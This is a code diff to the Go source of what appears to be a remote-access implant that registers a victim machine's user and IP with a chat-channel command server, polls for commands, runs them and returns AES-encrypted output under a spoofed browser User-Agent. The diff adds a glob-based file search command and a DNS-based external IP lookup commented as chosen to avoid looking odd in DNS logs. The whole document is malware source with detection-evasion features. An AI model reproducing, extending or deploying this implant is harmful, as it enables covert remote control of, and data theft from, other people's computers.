@@ -9,9 +9,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/atotto/clipboard"
-	"github.com/kbinani/screenshot"
-	"golang.org/x/sys/windows"
 	"image/png"
 	"io"
 	"io/ioutil"
@@ -30,6 +27,12 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"github.com/atotto/clipboard"
+	"github.com/bmatcuk/doublestar"
+	"github.com/kbinani/screenshot"
+	"github.com/miekg/dns"
+	"golang.org/x/sys/windows"
 )
 
 //Global variables
@@ -39,9 +42,10 @@ var processed_ids []string
 var responses = "RESPONSE_CHANNEL"
 var registration = "REGISTRATION_CHANNEL"
 var commands = "COMMANDS_CHANNEL"
-var bearer = "Bearer " + "BEARERTOKEN"
+var bearer = "BEARERTOKEN"
 var token = "TOKENTOKEN"
-var key = []byte("AESKEY")
+var key = "AESKEY"
+var keyBytes = []byte(key)
 var iv = []byte("1337133713371337")
 
 type AES_CBC struct{}
@@ -896,7 +900,7 @@ func spacePad(value string, size string) string { // Pads a string for pretty fo
 }
 
 func EncryptFile(origData []byte) ([]byte, error) { // Encrypt a file
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return nil, err
 	}
@@ -910,7 +914,7 @@ func EncryptFile(origData []byte) ([]byte, error) { // Encrypt a file
 
 func DecryptFile(crypted []byte) (string, error) { // Decrypt a file (currently unused)
 	decodeData := []byte(crypted)
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return "", err
 	}
@@ -922,7 +926,7 @@ func DecryptFile(crypted []byte) (string, error) { // Decrypt a file (currently 
 }
 
 func Encrypt(origData []byte) (string, error) { // Encrypt a string
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return "", err
 	}
@@ -939,7 +943,7 @@ func Decrypt(crypted string) (string, error) { // decrypt a string
 	if err != nil {
 		return "", err
 	}
-	block, err := aes.NewCipher(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return "", err
 	}
@@ -974,7 +978,7 @@ func PKCS5UnPadding(origData []byte) []byte { //Used for Crypto
 	return origData[:(length - unpadding)]
 }
 
-func GetOutboundIP() string { // Get preferred outbound ip of this machine
+func GetLANOutboundIP() string { // Get preferred outbound ip of this machine
 	conn, err := net.Dial("udp", "4.5.6.7:1337") //This doesn't actually make a connection
 	if err != nil {
 		log.Fatal(err)
@@ -984,6 +988,29 @@ func GetOutboundIP() string { // Get preferred outbound ip of this machine
 	IP := localAddr.IP.String()
 	return IP
 
+}
+
+func GetWANOutboundIP() string { // Get external WAN outbound ip of this machine
+	// high speed response, won't look that weird in DNS logs
+	target := "o-o.myaddr.l.google.com"
+	server := "ns1.google.com"
+
+	c := dns.Client{}
+	m := dns.Msg{}
+	m.SetQuestion(target+".", dns.TypeTXT)
+	r, _, err := c.Exchange(&m, server+":53")
+	if err != nil {
+		return ""
+	}
+	if len(r.Answer) == 0 {
+		return ""
+	}
+	for _, ans := range r.Answer {
+		TXTrecord := ans.(*dns.TXT)
+		// shouldn't ever be multiple, but provide the full answer if we ever do
+		return strings.Join(TXTrecord.Txt, ",")
+	}
+	return ""
 }
 
 func whoami() string { // returns the current user
@@ -1062,7 +1089,35 @@ func ls(location string) string { // Lists the files in the given directory
 			dir = "   <DIR>    "
 		}
 		result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + f.Name() + "\n"
+	}
+	return result
+}
 
+func find(glob string) string { // Searches the current directory for the glob
+	filenames, err := doublestar.Glob(glob)
+	if err != nil {
+		return "Invalid glob pattern."
+	}
+	var result string
+	if len(filenames) > 0 {
+		for _, filename := range filenames {
+			f, err := os.Stat(filename)
+			if err != nil {
+				// If we can't stat the file for some reason, don't prevent other results from being returned
+				result = result + spacePad("n/a", "ts") + "   <ERR>    " + spacePad("n/a", "size") + "     " + filename + "\n"
+				continue
+			}
+			size := ByteCountDecimal(f.Size())
+			timestamp := f.ModTime()
+			ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
+			dir := "            "
+			if f.IsDir() {
+				dir = "   <DIR>    "
+			}
+			result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + filename + "\n"
+		}
+	} else {
+		return "No matches."
 	}
 	return result
 }
@@ -1539,11 +1594,11 @@ func Register(client_ID string) { // Send a message to the registration channel 
 	} else {
 		user = whoami()
 	}
-	info := client_ID + ":" + name + ":" + user + ":" + GetOutboundIP() + ":" + string(getVersion())
+	info := client_ID + ":" + name + ":" + user + ":" + GetLANOutboundIP() + ":" + string(getVersion())
 	v.Set("text", info)
 	//pass the values to the request's body
 	req, err := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
-	req.Header.Add("Authorization", bearer)
+	req.Header.Add("Authorization", "Bearer "+bearer)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	_, netError := client.Do(req)
@@ -1587,7 +1642,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 	v.Set("oldest", t)
 	//pass the values to the request's body
 	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
-	req.Header.Add("Authorization", bearer)
+	req.Header.Add("Authorization", "Bearer "+bearer)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	resp, netError := client.Do(req)
@@ -1806,6 +1861,11 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 			encryptedOutput, _ := Encrypt([]byte(ls))
 			SendResult(client_id, job_id, "output", encryptedOutput)
 
+		case "find":
+			find := find(args[1])
+			encryptedOutput, _ := Encrypt([]byte(find))
+			SendResult(client_id, job_id, "output", encryptedOutput)
+
 		case "rm":
 			rm := deleteFile(args[1])
 			encryptedOutput, _ := Encrypt([]byte(rm))
@@ -1869,6 +1929,11 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 		case "ifconfig":
 			ifconfig := ifconfig()
 			encryptedOutput, _ := Encrypt([]byte(ifconfig))
+			SendResult(client_id, job_id, "output", encryptedOutput)
+
+		case "getip":
+			ipaddr := GetWANOutboundIP()
+			encryptedOutput, _ := Encrypt([]byte(ipaddr))
 			SendResult(client_id, job_id, "output", encryptedOutput)
 
 		case "whoami":
@@ -1938,7 +2003,7 @@ func SendResult(client_ID, job_ID, cmd_type, output string) { //Sends a response
 	//pass the values to the request's body
 	fmt.Println("Sending result...")
 	req, _ := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
-	req.Header.Add("Authorization", bearer)
+	req.Header.Add("Authorization", "Bearer "+bearer)
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	_, netError := client.Do(req)
